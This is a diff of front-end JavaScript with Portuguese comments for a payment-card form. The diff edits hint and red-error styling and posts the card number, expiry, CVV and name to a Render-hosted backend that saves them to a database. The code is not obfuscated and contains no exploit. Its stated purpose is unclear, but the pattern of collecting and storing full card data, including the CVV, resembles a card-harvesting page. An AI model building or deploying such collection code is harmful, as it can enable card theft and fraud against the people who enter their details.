@@ -15,26 +15,23 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    // --- LÓGICA DE DICAS (CINZA) ---
+    // --- DICAS (MANTIDO IGUAL AO SEU) ---
     for (const key in campos) {
         const input = campos[key];
-        if (input) {
-            input.addEventListener("focus", () => {
-                removeMensagemDica(input);
-                const dica = document.createElement("span");
-                dica.classList.add("mensagem-dica");
-                dica.style.color = "#666";
-                dica.style.fontSize = "12px";
-                dica.style.display = "block";
-                dica.style.marginTop = "4px";
-                dica.textContent = mensagensDica[key];
-                input.parentElement.appendChild(dica);
-            });
-
-            input.addEventListener("blur", () => {
-                removeMensagemDica(input);
-            });
-        }
+        input.addEventListener("focus", () => {
+            removeMensagemDica(input);
+            const dica = document.createElement("span");
+            dica.classList.add("mensagem-dica");
+            dica.style.color = "#666";
+            dica.style.fontSize = "12px";
+            dica.style.display = "block";
+            dica.style.marginTop = "4px";
+            dica.textContent = mensagensDica[key];
+            input.parentElement.appendChild(dica);
+        });
+        input.addEventListener("blur", () => {
+            removeMensagemDica(input);
+        });
     }
 
     function removeMensagemDica(input) {
@@ -42,14 +39,14 @@ document.addEventListener("DOMContentLoaded", () => {
         if (existing) existing.remove();
     }
 
-    // --- EVENTO DE ENVIO ---
+    // --- EVENTO DE SUBMIT (AQUI ESTÁ A LÓGICA DO AVISO VERMELHO) ---
     form.addEventListener("submit", async (event) => {
         event.preventDefault();
 
-        // Limpa erros anteriores
+        // Limpa mensagens de erro anteriores para não duplicar
         document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
 
-        const inputsParaValidar = {
+        const inputs = {
             numero: campos.numero,
             data: campos.data,
             cvv: campos.cvv,
@@ -67,9 +64,9 @@ document.addEventListener("DOMContentLoaded", () => {
 
         let formValido = true;
 
-        // VALIDAÇÃO VISUAL (MENSAGENS VERMELHAS)
-        for (const key in inputsParaValidar) {
-            const input = inputsParaValidar[key];
+        // LOOP DE VALIDAÇÃO (CRIA O RETÂNGULO E O TEXTO VERMELHO)
+        for (const key in inputs) {
+            const input = inputs[key];
 
             if (!input || (input.value === "" || input.value === undefined)) {
                 formValido = false;
@@ -77,24 +74,26 @@ document.addEventListener("DOMContentLoaded", () => {
                 if (key === "tipo") {
                     const radios = document.querySelectorAll('input[name="gender"]');
                     radios.forEach(r => {
-                        r.parentElement.style.border = "1px solid red";
+                        r.parentElement.style.border = "1px solid red"; // Retângulo Vermelho
                         r.parentElement.style.borderRadius = "8px";
+                        r.parentElement.style.padding = "5px";
                     });
 
                     const container = document.querySelector(".radio-container");
                     const erro = document.createElement("span");
                     erro.classList.add("mensagem-erro");
-                    erro.style.color = "red";
+                    erro.style.color = "red"; // Texto Vermelho
                     erro.style.fontSize = "14px";
                     erro.textContent = mensagensErro[key];
                     container.appendChild(erro);
+
                 } else {
-                    input.style.border = "1px solid red";
+                    input.style.border = "1px solid red"; // Retângulo Vermelho
                     input.style.borderRadius = "8px";
 
                     const erro = document.createElement("span");
                     erro.classList.add("mensagem-erro");
-                    erro.style.color = "red";
+                    erro.style.color = "red"; // Texto Vermelho
                     erro.style.fontSize = "14px";
                     erro.style.display = "block";
                     erro.style.marginTop = "4px";
@@ -102,6 +101,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     input.parentElement.appendChild(erro);
                 }
             } else {
+                // Se o campo for preenchido, limpa a borda vermelha
                 if (key === "tipo") {
                     document.querySelectorAll('input[name="gender"]').forEach(r => {
                         r.parentElement.style.border = "none";
@@ -112,15 +112,9 @@ document.addEventListener("DOMContentLoaded", () => {
             }
         }
 
-        // --- ENVIO PARA O SERVIDOR ---
+        // --- SÓ ENVIA SE O FORM FOR VÁLIDO ---
         if (formValido) {
-            // PEGA O BOTÃO E COLOCA O AVISO DE CARREGANDO
-            const botao = form.querySelector("button");
-            const textoOriginal = botao.textContent;
-            botao.disabled = true;
-            botao.textContent = "Processando..."; // Aviso de carregamento
-
-            const cardType = document.querySelector('input[name="gender"]:checked').value;
+            const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
             
             const dadosParaEnviar = {
                 numero: campos.numero.value,
@@ -131,7 +125,8 @@ document.addEventListener("DOMContentLoaded", () => {
             };
 
             try {
-                const urlDoServidor = "https://backend-g2xn.onrender.com/enviar-dados";
+                // ENVIO PARA O TEU RENDER
+                const urlDoServidor = "https://backend-g2xn.onrender.com";
 
                 const resposta = await fetch(urlDoServidor, {
                     method: 'POST',
@@ -140,17 +135,13 @@ document.addEventListener("DOMContentLoaded", () => {
                 });
 
                 if (resposta.ok) {
-                    window.location.href = "confirmacao.html";
+                    window.location.href = "confirmacao.html"; // Redireciona se deu certo
                 } else {
-                    alert("Erro ao processar dados.");
-                    botao.disabled = false;
-                    botao.textContent = textoOriginal;
+                    alert("Erro ao salvar no banco. Verifique o servidor.");
                 }
             } catch (error) {
                 console.error("Erro:", error);
-                alert("O servidor não respondeu.");
-                botao.disabled = false;
-                botao.textContent = textoOriginal;
+                alert("Servidor offline!");
             }
         }
     });
